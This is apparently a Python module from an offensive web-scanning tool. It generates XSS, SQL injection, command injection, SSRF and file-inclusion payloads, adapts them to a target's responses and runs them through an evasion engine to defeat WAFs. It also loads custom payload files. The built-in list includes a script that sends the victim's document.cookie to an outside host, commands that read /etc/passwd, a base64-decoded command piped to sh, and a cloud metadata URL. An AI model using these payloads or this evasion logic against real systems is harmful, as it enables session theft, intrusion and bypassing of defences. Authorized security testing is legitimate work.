import random
from typing import Dict, List
from engines.evasion import EvasionEngine
from utils.colors import info, error

class DynamicPayloadGenerator:
    """Generates adaptive payloads in real-time."""
    @staticmethod
    def generate_adaptive_payload(target_type: str, response_analysis: Dict = None) -> str:
        """Generate payload adapted to target and response."""
        base_payloads = {
            'xss': [
                '<script>fetch("https://xss.report/"+document.cookie)</script>',
                '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
                '<svg/onload=eval(name)>',
                '<body onpointernter=eval(name)>',
                '<details open ontoggle=eval(name)>',
            ],
            'sqli': [
                "' OR '1'='1' -- -",
                "' UNION SELECT 1,2,3,4 -- -",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) -- -",
                "1; WAITFOR DELAY '00:00:05' -- -",
            ],
            'cmdi': [
                ';id',
                '|cat /etc/passwd',
                '$(printf \'\\x69\\x64\')',
                '$(echo aWQ=|base64 -d|sh)',
            ],
            'ssrf': [
                'http://169.254.169.254/latest/meta-data/',
                'http://127.0.0.1:8080/admin',
                'file:///etc/passwd',
            ],
            'lfi': [
                '../../../etc/passwd',
                'php://filter/read=convert.base64-encode/resource=index.php',
                '....//....//....//etc/passwd',
            ],
        }
        payloads = base_payloads.get(target_type, base_payloads['xss'])
        payload = random.choice(payloads)
        # Adapt based on response analysis
        if response_analysis:
            payload = DynamicPayloadGenerator._adapt_to_response(
                payload, response_analysis)
        # Apply chaos
        payload = EvasionEngine.generate_chaos_payload(
            payload, chaos_level=random.randint(3, 5))
        return payload

    @staticmethod
    def _adapt_to_response(payload: str, analysis: Dict) -> str:
        """Adapt payload based on response analysis."""
        # If WAF detected, increase evasion
        if analysis.get('waf_detected'):
            payload = EvasionEngine.generate_chaos_payload(
                payload, chaos_level=5)
        # If encoding detected, change encoding
        if analysis.get('encoding_detected'):
            encodings = ['url', 'unicode', 'hex', 'base64']
            payload = EvasionEngine._apply_encoding(
                payload, random.choice(encodings))
        return payload

class CustomPayloadLoader:
    """Loads and processes custom payload files."""
    @staticmethod
    def load_payloads(filepath: str) -> List[str]:
        """Load payloads from file."""
        payloads = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append(line)
            info(f"Loaded {len(payloads)} custom payloads from {filepath}")
        except Exception as e:
            error(f"Failed to load payloads from {filepath}: {e}")
        return payloads

    @staticmethod
    def process_payloads(payloads: List[str], process_type: str = 'direct') -> List[str]:
        """Process loaded payloads with specified method."""
        processed = []
        for payload in payloads:
            if process_type == 'chaos':
                processed.append(EvasionEngine.generate_chaos_payload(
                    payload, chaos_level=5))
            elif process_type == 'encode':
                processed.append(EvasionEngine._apply_encoding(payload, 'url'))
            elif process_type == 'fragment':
                processed.append(EvasionEngine._fragment_payload(payload))
            else:
                processed.append(payload)
        return processed
